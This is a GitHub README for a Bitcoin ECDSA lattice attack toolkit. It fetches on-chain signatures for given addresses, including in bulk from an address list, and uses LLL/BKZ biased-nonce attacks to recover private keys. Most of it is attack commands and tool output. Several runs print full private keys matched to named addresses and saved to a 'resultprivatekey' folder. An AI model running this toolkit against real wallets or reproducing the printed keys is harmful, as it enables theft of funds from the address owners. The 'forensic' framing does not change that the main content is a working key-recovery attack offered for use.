<img width="1148" height="883" alt="Screenshot 2026 04 22 - 19 55 07 95" src="https://github.com/user-attachments/assets/f944adae-22a9-4e3d-a56d-c2fba477a4ab" />

# LLL-Attacks-ECDSA-Attacks
LLL-based ECDSA lattice attack toolkit for recovering private keys from weak or biased nonces. Includes CVP solving and real-world signature analysis
Note : WITOUT SAGEMATH NOT WORK
# install
```bash
git clone https://github.com/Cryptographytube/LLL-Attacks-ECDSA-Attacks
cd LLL-Attacks-ECDSA-Attacks
pip install fpylll
conda create -n sage -c conda-forge sagemath -y
conda activate sage
```
```bash
python3 test_generate.py --b 8 --sigs 60
```
# Vulnerability Finder

```bash
python3 ecdsa_forensic.py
```
# EXP
```bash
python ecdsa_forensic.py

╔══════════════════════════════════════════════════════════════════════╗
║  HNP/CVP  |  Biased-Nonce LSB Leakage — BIT Detector               ║
║  Methods: Entropy Analysis · Chi-Square Test · HNP Lattice Prep    ║
║                                                                      ║
║  Channel : CRYPTOGRAPHYTUBE                                          ║
║  Author  : sisujhon                                                  ║
╚══════════════════════════════════════════════════════════════════════╝

[?] Max TX to fetch per address (default 200): 2000
[?] Mode — [1] Single address  [2] Bulk from btc.txt : 2
[*] Resuming from checkpoint #53  (65097 remaining)

────────────────────────────────────────────────────────────────────
  Auditing: 1K1KYhxGDMTBJdhob9x9UWun7t5aVyuXZr
────────────────────────────────────────────────────────────────────
    - Total TX on-chain     : 49
    - TX to fetch (limit)   : 49
    - Fetched               : 20 / 49 TX                                         ✓
    - Signatures extracted  : 20
    - Unique pubkeys found  : 1
    - Min sigs for analysis : 2

    Analyzed 1 pubkey group(s):

    ╔════════════════════════════════════════════════════════════════════════╗
    ║ PUBKEY: 03a3f1185545db309a2aacbc5afc7f3d...              ║
    ║ SIGS  : 20          VERDICT:  ★ 00000 ★ (Score: 50/100)    ║
    ╠════════════════════════════════════════════════════════════════════════╣
    ║ DEEP BIAS SCAN: Depth= 1 bits [▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱] Success=100%  ║
    ║ PARTIAL KEY  : d mod 2^ 1 = 0x1 (verified)   ║
    ║ NONCE MODEL  : k mod 2^ 1 = 0x0 (fixed offset) ║
    ╠────────────────────────────────────────────────────────────────────────╣
    ║ ⚡ [TIER-1] LSB leak: b=1 bits | consistency=100.0% | 9/9 sigs agree  ║
    ║ ⚑ [TIER-2] LSB hint: b=3 bits | consistency=66.7% | 5.3x above rando ║
    ║ ⚑ [TIER-2] LSB hint: b=4 bits | consistency=44.4% | 7.1x above rando ║
    ║ ⚑ [TIER-2] LSB hint: b=5 bits | consistency=44.4% | 14.2x above rand ║
    ║ ⚑ [TIER-2] LSB hint: b=6 bits | consistency=33.3% | 21.3x above rand ║
    ║ ⚑ [TIER-2] LSB hint: b=7 bits | consistency=33.3% | 42.7x above rand ║
    ║ ⚑ [TIER-2] MSB hint: b=3 bits | fraction=40.0% | 3.2x above random   ║
    ║ ⚑ [VERIFY] mod-N check: 5/20 sigs (25%) satisfy s·k_lsb ≡ z + r·d (m ║
    ║ ⚑ [PROOF] k reconstruction WEAK: 6/20 sigs match (noise=70%) — possi ║
    ║ ⚑ [WARN] High noise rate 70% — possible mixed keys in group or weak  ║
    ╚════════════════════════════════════════════════════════════════════════╝
    => Saved: results\1K1KYhxGDMTBJdhob9x9UWun7t5aVyuXZr\pubkey_03a3f1185545db30/
    [+] LLL input file saved: 1K1KYhxGDMTBJdhob9x9UWun7t5aVyuXZr.txt
        Run: python3 lll.py  → enter file: 1K1KYhxGDMTBJdhob9x9UWun7t5aVyuXZr.txt
       vuln_info.txt | per_tx_vuln_detail.txt | vulnerable_data.txt | hnp_lattice.txt | multi_depth_merge.txt | k_reconstruction.txt | lattice_attack.sage | 1K1KYhxGDMTBJdhob9x9UWun7t5aVyuXZr.txt

[LLL] ══ Starting LLL-Attack-v6 for 1K1KYhxGDMTBJdhob9x9UWun7t5aVyuXZr ══
[LLL] Signatures supplied : 20
[LLL] Running NO-MISS Biased-Nonce LLL/BKZ multi-attack engine ...
[LLL] Launching 31 parallel workers across priority dimensions...
[LLL] No private key candidates recovered after full NO-MISS sweep.
[LLL] Reason: Target likely has no nonce bias, or leakage is too complex.
```

# EXP  LLL-PRO.py
```bash

  ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗  ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
 ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝
 ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║██║  ███╗██████╔╝███████║██████╔╝███████║ ╚████╔╝    ██║   ██║   ██║██████╔╝█████╗
 ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝     ██║   ██║   ██║██╔══██╗██╔══╝
 ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║   ██║      ██║   ╚██████╔╝██████╔╝███████╗
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝
                                          LLL-Attack CRYPTOGRAPHYTUBE  |  HNP/CVP  |  Biased-Nonce LSB Leakage

  Author : sisujhon

  [?] ecdsa_forensic.py has created a .txt file named after the address.
      Example: 1A1zPfix karo 1eP5QGefi2DMPTfTL5SLmv7DivfNa.txt


  [+] Address  : 1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d
  [+] RSZ rows : 144

[LLL] ══ Starting LLL-Attack-v6 for 1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d ══
[LLL] Signatures supplied : 144
[LLL] SageMath: OK
[LLL] fpylll: OK (BKZ acceleration enabled)
[LLL] Running NO-MISS Biased-Nonce LLL/BKZ multi-attack engine ...

====================================================================
  FORENSIC BIAS CENSUS REPORT
====================================================================
  Total Signatures Analyzed : 144
--------------------------------------------------------------------

  [+] LSB LEAKAGE FOUND
  |- Leakage Depth  : 1 bit(s)
  |- Affected TXs   : 75 / 144  (52%)
  |- Pattern        : 0x0
  |- Meaning        : k mod 2^1 == 0  =>  nonce is always EVEN  [STRONG BIAS]

  |- Bit-Depth Analysis (LSB):
      Bits   Match   Ratio%  Pattern
     ─────  ──────  ───────  ──────────
         1      75   52.1%  0x0000  ############### <<< BEST
         2      38   26.4%  0x0000  #######
         3      20   13.9%  0x0000  ####
         4      12    8.3%  0x0000  ##

  |- Biased Transactions (75 total, showing up to 15):
       #                   TXID                   k_low_bits
     ───  ──────────────────────────────────────  ────────────
       1  Unknown-TXID                            0x0
       2  Unknown-TXID                            0x0
       3  Unknown-TXID                            0x0
       4  Unknown-TXID                            0x0
       5  Unknown-TXID                            0x0
       6  Unknown-TXID                            0x0
       7  Unknown-TXID                            0x0
       8  Unknown-TXID                            0x0
       9  Unknown-TXID                            0x0
      10  Unknown-TXID                            0x0
      11  Unknown-TXID                            0x0
      12  Unknown-TXID                            0x0
      13  Unknown-TXID                            0x0
      14  Unknown-TXID                            0x0
      15  Unknown-TXID                            0x0
     ... +60 more

--------------------------------------------------------------------

  [+] MSB LEAKAGE FOUND
  |- Leakage Depth  : 1 bit(s)
  |- Affected TXs   : 77 / 144  (53%)
  |- Pattern        : 0x1
  |- Meaning        : k top 1 bits == 1  =>  MSB fixed

  |- Bit-Depth Analysis (MSB):
      Bits   Match   Ratio%  Pattern
     ─────  ──────  ───────  ──────────
         1      77   53.5%  0x0001  ################ <<< BEST
         2      43   29.9%  0x0003  ########
         3      25   17.4%  0x0007  #####
         4      13    9.0%  0x000e  ##

--------------------------------------------------------------------

====================================================================
  ATTACK FEASIBILITY VERDICT
====================================================================
  |- LSB     1-bit : need ~260 sigs, have 144  [LOW]
  |- MSB     1-bit : need ~260 sigs, have 144  [LOW]

  >>> Strategy: [('LSB', 1), ('MSB', 1)]
  >>> WARNING: Borderline — attack may need more signatures
====================================================================

────────────────────────────────────────────────────────────────────
Ready.
    [LLL] Workers active: 31
    - Worker: BKZ-Deep scan active...
    - Worker: Small-K scan active...
    - Worker: Small-K scan finished.
    - Worker: BKZ-Deep scan finished.

    [LLL] Initial Lattice scan complete. 0 potential candidates found.
[LLL] Phase 1 complete. Proceeding to Deep Search Engine...
[LLL] Deep Search Engine: 144 sigs | Parallel Scan starting on 5 cores...
[PROGRESS] Task #11 | Audit: MSB-1bits (m=48) ... [LLL] Task Generator: Entering Exhaustive Audit (1-256 bits)...
[PROGRESS] Task #12 | Audit: MSB-2bits (m=32) ... [!] WARNING: Performing full 1-256 bit sweep for LSB & MSB (512+ tasks).
[!] This is a true brute-force lattice attack and will take significant time!
[PROGRESS] Task #522 | Audit: MSB-250bits (m=24) ...
[LLL] ★★★ PRIVATE KEY FOUND via LATTICE SCAN ★★★
[LLL]   Compressed   : 1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d ← MATCH
[LLL]   Uncompressed : 1DYTnaCoLumzhCDB1h8NPHbruHwPzbx9qK
[LLL]   Private key  : 0xc7d7f8d7bf45cb9608225b9c97d2a960d7186394d4ebd754d4f5ef8b0a7982a6

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[LLL]   Saved to     : /mnt/c/bitsa/dfd/rrrrrrrrrrrrrrrrrrrrrrrrrrrrrr/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d/found.txt
[LLL]   mathfound.txt: /mnt/c/bitsa/dfd/rrrrrrrrrrrrrrrrrrrrrrrrrrrrrr/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d/mathfound.txt

[LLL] ★ RECOVERED KEY (UNMATCHED) via LATTICE SCAN ★
[LLL]   Compressed   : 1D1eQ2yWPipciScbctCrhCrMu6vgPs9WpH
[LLL]   Uncompressed : 1DNhkS8JDBBYt4XdQkWzLE38e8LGBoCsaE
[LLL]   Private key  : 0x17eacc5b51ba7bb8584c0aa2a9df363ff9da57f1f74bb7c616da90690a6a10d2

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[PROGRESS] Task #523 | Audit: MSB-251bits (m=24) ...
[LLL] ★ RECOVERED KEY (UNMATCHED) via LATTICE SCAN ★
[LLL]   Compressed   : 1EE6tEb6KVnWgyHYLkNvDMNwYEXnssycNd
[LLL]   Uncompressed : 1ZF1oFe8cbytdDGA3ebmiW7prPMbLo6kE
[LLL]   Private key  : 0x27b4477f81a229732abf6be3f89e4fa64a6ab66dcc183faaa622a1d042973d60

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[PROGRESS] Task #525 | Audit: MSB-252bits (m=24) ...
[LLL] ★ RECOVERED KEY (UNMATCHED) via LATTICE SCAN ★
[LLL]   Compressed   : 1BaPYg4pLpfxn5cBPqjwK8La5w6gVqpDSz
[LLL]   Uncompressed : 1E4wyZXLSMJvHDwLaW6akYUsiC3f9NPPsq
[LLL]   Private key  : 0x24779753886be566a6ea672a47887cf3757047da4de12b6788ced5ceae8718ba

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[PROGRESS] Task #527 | Audit: MSB-253bits (m=24) ...
[LLL] ★ RECOVERED KEY (UNMATCHED) via LATTICE SCAN ★
[LLL]   Compressed   : 1JuEUxRDekHiBYKUfnvQZHe7FPMfayeJzS
[LLL]   Uncompressed : 1MK6SiV1obn15MLG4d4h889rq8UQKxZyen
[LLL]   Private key  : 0xbb2c26ea01bb524aa6036deaee000cacdbfb212d10e0bc909b61692952957161

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[PROGRESS] Task #529 | Audit: MSB-254bits (m=24) ...
[LLL] ★ RECOVERED KEY (UNMATCHED) via LATTICE SCAN ★
[LLL]   Compressed   : 1FhLTmxnhnt2R8nYydDbtr6RqrWNe5fAYX
[LLL]   Uncompressed : 12F3vuxKpSpj5fuxgxUprtSNPTzZ6tk9DH
[LLL]   Private key  : 0x95812cad3317c5d237a2dc925b47e8845a1ad55f90241e5b6c2f22a7c07460d8

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[PROGRESS] Task #531 | Audit: MSB-255bits (m=24) ...
[LLL] ★ RECOVERED KEY (UNMATCHED) via LATTICE SCAN ★
[LLL]   Compressed   : 1KrznMXHQWcoTpVnQWkFS8kKcDEwjHV4ev
[LLL]   Uncompressed : 17iFyavhrFEm6RJMxnjQkRxHZX4YMYAF7u
[LLL]   Private key  : 0xebd3351ca8ca1f360cf5da18635138a3a4b9da9961b481fc7ce3701ed9a16785

    [EXPORT] Private key secured in: resultprivatekey/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d.txt
[PROGRESS] Task #537 | Audit: LSB-256bits (m=24) ...
[LLL] Full Exhaustive Audit completed (537 lattice tasks total).
[LLL] Total unique candidates: 7 — verifying ...

[LLL] ★★★ PRIVATE KEY FOUND ★★★
[LLL]   Compressed   : 1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d ← MATCH
[LLL]   Uncompressed : 1DYTnaCoLumzhCDB1h8NPHbruHwPzbx9qK
[LLL]   Private key  : 0xc7d7f8d7bf45cb9608225b9c97d2a960d7186394d4ebd754d4f5ef8b0a7982a6
[LLL]   Saved to     : /mnt/c/bitsa/dfd/rrrrrrrrrrrrrrrrrrrrrrrrrrrrrr/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d/found.txt
[LLL]   mathfound.txt: /mnt/c/bitsa/dfd/rrrrrrrrrrrrrrrrrrrrrrrrrrrrrr/1EDLS29FrUDBDUoX96vD3iihXWje6nmj8d/mathfound.txt
[LLL] no-match  C=1D1eQ2yWPipciScbctCrhCrMu6vgPs9WpH  U=1DNhkS8JDBBYt4XdQkWzLE38e8LGBoCsaE  key=0x17eacc5b51ba7bb8584c0aa2a9df363ff9da57f1f74bb7c616da90690a6a10d2
[LLL] no-match  C=1EE6tEb6KVnWgyHYLkNvDMNwYEXnssycNd  U=1ZF1oFe8cbytdDGA3ebmiW7prPMbLo6kE  key=0x27b4477f81a229732abf6be3f89e4fa64a6ab66dcc183faaa622a1d042973d60
[LLL] no-match  C=1BaPYg4pLpfxn5cBPqjwK8La5w6gVqpDSz  U=1E4wyZXLSMJvHDwLaW6akYUsiC3f9NPPsq  key=0x24779753886be566a6ea672a47887cf3757047da4de12b6788ced5ceae8718ba
[LLL] no-match  C=1JuEUxRDekHiBYKUfnvQZHe7FPMfayeJzS  U=1MK6SiV1obn15MLG4d4h889rq8UQKxZyen  key=0xbb2c26ea01bb524aa6036deaee000cacdbfb212d10e0bc909b61692952957161
[LLL] no-match  C=1FhLTmxnhnt2R8nYydDbtr6RqrWNe5fAYX  U=12F3vuxKpSpj5fuxgxUprtSNPTzZ6tk9DH  key=0x95812cad3317c5d237a2dc925b47e8845a1ad55f90241e5b6c2f22a7c07460d8
[LLL] no-match  C=1KrznMXHQWcoTpVnQWkFS8kKcDEwjHV4ev  U=17iFyavhrFEm6RJMxnjQkRxHZX4YMYAF7u  key=0xebd3351ca8ca1f360cf5da18635138a3a4b9da9961b481fc7ce3701ed9a16785
[LLL] ══ Done ══


  ★★★ FOUND: 1 key(s) — saved to found.txt ★★★

# ATTACK
```bash
python3 run_attack.py 1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5
```
# ATTACK 2

```bash
python3 lll.py 1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5.txt
```

# EXP
```bash

  ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗  ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
 ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝
 ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║██║  ███╗██████╔╝███████║██████╔╝███████║ ╚████╔╝    ██║   ██║   ██║██████╔╝█████╗
 ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝     ██║   ██║   ██║██╔══██╗██╔══╝
 ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║   ██║      ██║   ╚██████╔╝██████╔╝███████╗
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝
                                          LLL-Attack CRYPTOGRAPHYTUBE  |  HNP/CVP  |  Biased-Nonce LSB Leakage

  Author : sisujhon

  [?] ecdsa_forensic.py has created a .txt file named after the address.
      Example: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.txt


  [+] Address  : 1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5
  [+] RSZ rows : 60

[LLL] ══ Starting LLL-Attack-v6 for 1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5 ══
[LLL] Signatures supplied : 60
[LLL] Running NO-MISS Biased-Nonce LLL/BKZ multi-attack engine ...
[LLL] Launching 31 parallel workers across priority dimensions...

[LLL] ★ KEY FOUND via parallel worker! ★
[LLL] Total unique candidates: 8 — verifying ...
[LLL] no-match  C=18vCs8ssQujzgtNtUrJv94YWu9cjqLDhMX  U=1Mv3UW931MwrmC9ybNZ7tamDAzYvytATFg  key=0x84948745997b10551e8962b5472e3eb1075a289e018f2543f06e68e330cc843d
[LLL] no-match  C=1FnLqCzLXGXH2YDpm7ojf5mLwwbKXwcMAK  U=1N8YTNJU4x6BhWX8ScoKsQMtHNnAQciufe  key=0x9c488f46667f8fd5dfb345f8ddae6493710646b00efb0ffda38e51747da2634c
[LLL] no-match  C=1BSFnx9UmoEx2ZrCvGVJgxyjMMga3gKFNX  U=13ipB6GcGCN1iqZ6ABPHnFhyKb3zbNbZMR  key=0x837ab0afc21d5a6c6d1afcf1f3f31698ac0a315e6682fdc78f7cbee1ca17c7d7
[LLL] no-match  C=14e7isC89qLwNgPCNyyonaV2WbB4CMxeeE  U=1P8gpdw8xy5SYJRvZt5FGkBf2VB7UpzChi  key=0xf3c0709ac03eba928dd4afee7f64b3f2e61cbc9f5409258b1cd456037b17dc27

[LLL] ★★★ PRIVATE KEY FOUND ★★★
[LLL]   Compressed   : 1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5 ← MATCH
[LLL]   Uncompressed : 15CB4e7hw8CrQJAYw8qnUQXNfeA9dL97dR
[LLL]   Private key  : 0x89ca32e6c0686533c8463151a4b36a7ad93fa712d572ab19770d28b3834827e7
[LLL]   Saved to     : ./1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5/found.txt
[LLL]   mathfound.txt: ./1DP3vc7QoRDGEy1L4p5nWHBQPfe9HWcoA5/mathfound.txt
[LLL] no-match  C=1KrSyLYnxZapNJ1fUu8qVipYwMdMoncqzA  U=19PtdczwVVSU1LKZ6g7UqWW72N2gjabboR  key=0xa750a60b8f01774ae01a99b1ecf8f7d5368bc4901c2d5ed4eaa6150faff725ef
[LLL] no-match  C=1DCGEswET3HGda8nVRu41ZNQf596jt8qV4  U=1HxEogG6V59g614bgF2BNLVVcdMBqnmZ34  key=0x8acf294556147fb3f0f057ad28ed55c9bfec410d3b3183beebc7328fa9eb4f67
[LLL] no-match  C=19MHYwRCKVX8KgJGX8cMhUCFH3u7XFDSiH  U=1DCiUzYBzRaF7DK1CaBu6y6YVFDAjeZiGd  key=0x4897707e9f171aa2f957ba32874bafca8195742b0e9d8d05df3d158114f523f3
[LLL] ══ Done ══


  ★★★ FOUND: 1 key(s) — saved to found.txt ★★★
```
# FAST V 10
```bash
python3 ecdsa_forensic.py

╔══════════════════════════════════════════════════════════════════════╗
║  HNP/CVP  |  Biased-Nonce LSB Leakage — BIT Detector               ║
║  Methods: Entropy Analysis · Chi-Square Test · HNP Lattice Prep    ║
║                                                                      ║
║  Channel : CRYPTOGRAPHYTUBE                                          ║
║  Author  : sisujhon                                                  ║
╚══════════════════════════════════════════════════════════════════════╝

[?] Max TX to fetch per address (default 200): 2000
[?] Mode — [1] Single address  [2] Bulk from btc.txt : 1
[?] Bitcoin address: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne

────────────────────────────────────────────────────────────────────
  Auditing: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne
────────────────────────────────────────────────────────────────────
    - Total TX on-chain     : 687
    - TX to fetch (limit)   : 687
    - Fetched               : 679 / 687 TX
    - Signatures extracted  : 679
    - Unique pubkeys found  : 1
    - Min sigs for analysis : 1


    ╔════════════════════════════════════════════════════════════════════════╗
    ║ PUBKEY: 03af529faff355e75f9e17ba9377b80e...              ║
    ║ SIGS  : 679         VERDICT:  CLEAN (Score: 35.567/100)         ║
    ╠════════════════════════════════════════════════════════════════════════╣
    ║ ⚑ [NEW] Deterministic nonce weakness detected                        ║
    ║ ⚑ [NEW] Clustering: 8 nonces share similar structure                 ║
    ║ ⚑ [VERIFY] mod-N check MEDIUM: 52%                                   ║
    ╚════════════════════════════════════════════════════════════════════════╝
    => Saved: results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/
    [+] LLL input file saved: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
        Run: python3 lll.py  → enter file: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
       vuln_info.txt | per_tx_vuln_detail.txt | vulnerable_data.txt | hnp_lattice.txt | multi_depth_merge.txt | 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
    => Results & LLL Input Saved.

[LLL] ══ Starting LLL-Attack-v6 for 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne ══
[LLL] Signatures supplied : 679
[LLL] Running NO-MISS Biased-Nonce LLL/BKZ multi-attack engine ...
[LLL] --- Preliminary Vulnerability Scan Report ---
    [+] Signatures Analyzed : 679
    [+] LSB Leakage Detected: 16 bits
    [+] MSB Leakage Detected: None bits
    [+] Magnitude (Small K) : Standard 256-bit
    [READY] Best Attack Strategy: [('LSB', 16)]

[LLL] Phase 1: Algebraic Pre-Scan (Speed: Fast)
    - Initializing Worker Pool (Brute-Force Mode)... Ready.
    [LLL] Workers active: 31
    - Worker: Linear-Step scan active...
    - Worker: Faulty-Sig scan active...
    - Worker: Fixed-S scan active...
    - Worker: Reused-Nonce scan active...
    - Worker: Inverse-Nonce scan active...
    - Worker: LCG-Correlation scan active...
    - Worker: Polnonce scan active...
    - Worker: Cluster-Diff scan active...
    - Worker: Super-Cluster scan active...
    - Worker: Fixed-S scan finished.
    - Worker: Inverse-Nonce scan finished.

[LLL] ★★★ PRIVATE KEY FOUND via SUPER-CLUSTER ★★★
[LLL]   Compressed   : 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne ← MATCH
[LLL]   Uncompressed : 1KLugbEQQKyPxHGqTNa7TSqhWxfBF9wVtR
[LLL]   Private key  : 0xc01a89275f701c8224cf416396f112da51362c37485c788dfc6179854f74e1e0
    ==> PRIVATE KEY SECURED IN: resultprivatekey/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
[LLL]   Saved to     : /mnt/c/bheeee/results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/found.txt
[LLL]   mathfound.txt: /mnt/c/bheeee/results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/mathfound.txt
    - Worker: Super-Cluster scan finished.
    - Worker: Polnonce scan finished.
    - Worker: Faulty-Sig scan finished.
    - Worker: LCG-Correlation scan finished.
    - Worker: Reused-Nonce scan finished.
    - Worker: Cluster-Diff scan finished.
    - Worker: Linear-Step scan finished.

    [LLL] Algebraic scan complete. 1 elite candidates found.
    - Verifying candidates via Point Mul... Done.

[LLL] ★★★ PRIVATE KEY FOUND via ALGEBRAIC SCAN ★★★
[LLL]   Compressed   : 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne ← MATCH
[LLL]   Uncompressed : 1KLugbEQQKyPxHGqTNa7TSqhWxfBF9wVtR
[LLL]   Private key  : 0xc01a89275f701c8224cf416396f112da51362c37485c788dfc6179854f74e1e0
    ==> PRIVATE KEY SECURED IN: resultprivatekey/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
[LLL]   Saved to     : /mnt/c/bheeee/results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/found.txt
[LLL]   mathfound.txt: /mnt/c/bheeee/results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/mathfound.txt
[LLL] Phase 1 audit complete. Proceeding to Deep Search Engine...
[LLL] Deep Search Engine: 100 sigs | Parallel Scan starting on 5 cores...
[PROGRESS] Task #18 | Audit: LSB-16bits (m=64) ...
[LLL] Full Exhaustive Audit completed (18 lattice tasks total).
[LLL] Total unique candidates: 1 — verifying ...

[LLL] ★★★ PRIVATE KEY FOUND ★★★
[LLL]   Compressed   : 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne ← MATCH
[LLL]   Uncompressed : 1KLugbEQQKyPxHGqTNa7TSqhWxfBF9wVtR
[LLL]   Private key  : 0xc01a89275f701c8224cf416396f112da51362c37485c788dfc6179854f74e1e0
[LLL]   Saved to     : /mnt/c/bheeee/results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/found.txt
[LLL]   mathfound.txt: /mnt/c/bheeee/results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/mathfound.txt
[LLL] ══ Done ══

    [!] Error saving to resultprivatekey: 'str' object cannot be interpreted as an integer

    *** LLL SUCCESS: PRIVATE KEY RECOVERED! ***
    => Saved: results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/
    [+] LLL input file saved: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
        Run: python3 lll.py  → enter file: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
       vuln_info.txt | per_tx_vuln_detail.txt | vulnerable_data.txt | hnp_lattice.txt | multi_depth_merge.txt | 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
    => Saved: results/1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne/pubkey_03af529faff355e7/
    [+] LLL input file saved: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
        Run: python3 lll.py  → enter file: 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt
       vuln_info.txt | per_tx_vuln_detail.txt | vulnerable_data.txt | hnp_lattice.txt | multi_depth_merge.txt | 1DHmu7BvzjpQQxbKEuqTU2zSvZmgZBBrne.txt

════════════════════════════════════════════════════════════════════
  FINAL REPORT
  Addresses scanned : 1
  Flagged (vuln/suspicious) : 1
  Time elapsed      : 212.84s
════════════════════════════════════════════════════════════════════
```

